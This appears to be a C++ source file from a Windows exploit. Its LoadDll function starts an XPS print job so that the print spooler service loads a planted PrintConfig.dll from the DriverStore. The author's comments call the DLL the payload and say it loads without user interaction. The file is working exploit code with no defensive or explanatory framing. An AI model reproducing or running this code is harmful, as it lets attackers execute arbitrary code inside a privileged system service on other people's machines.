// PrintConfigLoader.cpp : Defines the exported functions for the DLL.

//#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable : 4996)

#include <xpsprint.h>
#pragma comment(lib, "XpsPrint.lib")
#pragma warning(disable : 4995)

// Hmmm... A "Save Print Output As" pop up is popping up...
// There wasn't a pop up in the PoC ..
// The payload still loads without user interaction though so its only an annoyance.

// Loads PrintConfig.dll from paths similar to:
// C:\windows\System32\DriverStore\FileRepository\prnms003.inf_amd64_d953309ec763fcc7\Amd64\PrintConfig.dll
// C:\windows\System32\DriverStore\FileRepository\prnms003.inf_x86_5b0184fdd4027e3f\I386\PrintConfig.dll
void LoadDll()
{
	//After writing PrintConfig.dll we start an XpsPrintJob to load the dll into the print spooler service.
	CoInitialize(nullptr);
	IXpsOMObjectFactory* xpsFactory = NULL;
	CoCreateInstance(__uuidof(XpsOMObjectFactory), NULL, CLSCTX_INPROC_SERVER, __uuidof(IXpsOMObjectFactory), reinterpret_cast<LPVOID*>(&xpsFactory));
	HANDLE completionEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	IXpsPrintJob* job = NULL;
	IXpsPrintJobStream* jobStream = NULL;
	StartXpsPrintJob(L"Microsoft XPS Document Writer", L"Print Job 1", NULL, NULL, completionEvent, NULL, 0, &job, &jobStream, NULL);
	jobStream->Close();
	CoUninitialize();
}
